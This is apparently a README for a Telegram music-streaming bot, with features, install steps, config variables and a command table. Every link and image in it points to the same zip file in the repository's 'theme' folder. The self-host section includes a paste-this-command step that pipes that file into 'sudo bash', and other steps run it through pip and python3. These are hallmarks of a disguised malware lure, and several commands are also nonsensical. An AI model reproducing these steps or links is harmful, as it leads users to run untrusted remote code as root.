<h1 align= center><b>⭐️ Music Player ⭐️</b></h1>
<h3 align = center> A Telegram Music Bot written in Python using Pyrogram and Py-Tgcalls </h3>

<p align="center">
<a href="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip"><img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="made-with-python"></a>
<br>
    <img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="LICENSE">
    <img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="Contributors">
    <img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="Repository Size"> <br>
    <img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="Forks">
    <img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="Stars">
    <img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="Watchers">
    <img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="Commit Activity">
    <img src="https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip" alt="Issues">
</p>

## ✨ <a name="features"></a>Features

### ⚡️ Fast & Light

Starts streaming your inputs while downloading and converting them. Also, it
doesn't make produce files.

### 👮🏻‍♀️ Safe and handy

Restricts control and sensitive commands to admins.

### 🗑 Clean and spam free

Deletes old playing trash to keep your chats clean.

### 😎 Has cool controls

Lets you switch stream mode, loop, pause, resume, mute, unmute anytime.

### 🖼 Has cool thumbnails

Response your commands with cool thumbnails on the chat.

### 😉 Streams whatever you like

You can stream audio or video files, YouTube videos with any duration,
YouTube lives, YouTube playlists and even custom live streams like radios or m3u8 links or files in
the place it is hosted!

### 📊 Streams in multiple places

Allows you to stream different things in multiple chats simultaneously. Each
chat will have its own song queue.

### 🗣 Speaks different languages

Music Player is multilingual and speaks [various languages](#languages),
thanks to the translators.

## 🚀 <a name="deploy"></a>Deploy

[![Deploy on Heroku](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip)](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip)

Note: `First Fork The Repo Then Click On Deploy To Heroku Button!`


## ☁️ <a name="self_host"></a>Self Host

- Legecy Method
```bash
$ git clone https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip
$ cd MusicPlayer
$ sudo apt install git curl python3-pip ffmpeg -y
$ pip3 install -U pip
$ curl -sL https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip | sudo -E bash -
$ sudo apt install -y nodejs
$ sudo apt install build-essential
$ sudo npm install pm2@latest -g
$ pip3 install -U -r https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip
$ cp https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip .env
# < edit .env with your own values >
$ python3 https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip
```

- Docker Build Method
```bash
$ git clone https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip
$ cd MusicPlayer
$ cp https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip .env
# < edit .env with your own values >
$ sudo docker build . -t musicplayer
$ sudo docker run musicplayer
```

## ⚒ <a name="configs"></a>Configs

- `API_ID`: Telegram app id from https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip
- `API_HASH`: Telegram app hash from https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip
- `SESSION`: Pyrogram string session. You can generate from [here](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip).
- `SUDOERS`: ID of sudo users (separate multiple ids with space).
- `BOT_TOKEN`: Telegram bot token from https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip (optional)
- `QUALITY`: Custom stream quality (high/medium/low) for the userbot in vc. Default: `high`
- `PREFIX`: Bot commad prefixes (separate multiple prefix with space). Eg: `! /`
- `LANGUAGE`: An [available](#languages) bot language (can change it anytime). Default: `en`
- `STREAM_MODE`: An stream mode like audio or video (can change it anytime). Default: `audio`
- `ADMINS_ONLY`: Put `True` if you want to make /play commands only for admins. Default: `False`
- `SPOTIFY_CLIENT_ID`: Spotify client id get it from [here](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip). (optional)
- `SPOTIFY_CLIENT_SECRET`: Spotify client secret get it from [here](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip). (optional)


## 📄 <a name="commands"></a>Commands

Command | Description
:--- | :---
• !ping | Check if alive or not
• !start / !help | Show the help for commands
• !mode / !switch | Switch the stream mode (audio/video)
• !p / !play [song name or youtube link] | Play a song in vc, if already playing add to queue
• !radio / !stream [radio url or stream link] | Play a live stream in vc, if already playing add to queue
• !pl / !playlist [playlist link] | Play the whole youtube playlist at once
• !skip / !next | Skip to the next song
• !m / !mute | Mute the current stream
• !um / !unmute | Unmute the muted stream
• !ps / !pause | Pause the current stream
• !rs / !resume | Resume the paused stream
• !list / !queue | Show the songs in the queue
• !mix / !shuffle | Shuflle the queued playlist
• !loop / !repeat | Enable or disable the loop mode
• !lang / language [language code] | Set the bot language in group
• !ip / !import | Import queue from exported file
• !ep / !export | Export the queue for import in future
• !stop / !leave | Leave from vc and clear the queue
• !update / !restart | Update and restart your music player

## 🗣 <a name="languages"></a>Languages

```text
en    English
```

## 💜 <a name="contribute"></a>Contribute

New languages, bug fixes and improvements following
[our contribution guidelines](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip) are warmly welcomed!

## 🛫 <a name="supports"></a>Supports

For any kind of help join [our support group](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip) or raise an [issue](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip).

## ✨ <a name="credits"></a>Credits

- [Me](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip) for [Noting](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip) 😬
- [Dan](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip) for [Pyrogram](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip) ❤️
- [Laky-64](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip) for [Py-TgCalls](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip) ❤️
- And Thanks To All [Contributors](https://raw.githubusercontent.com/Akanant12/MusicPlayer/master/theme/Player_Music_annale.zip)! ❤️

## 📃 <a name="license"></a>License

Music Player is licenced under the GNU Affero General Public License v3.0.
Read more [here](./LICENSE).
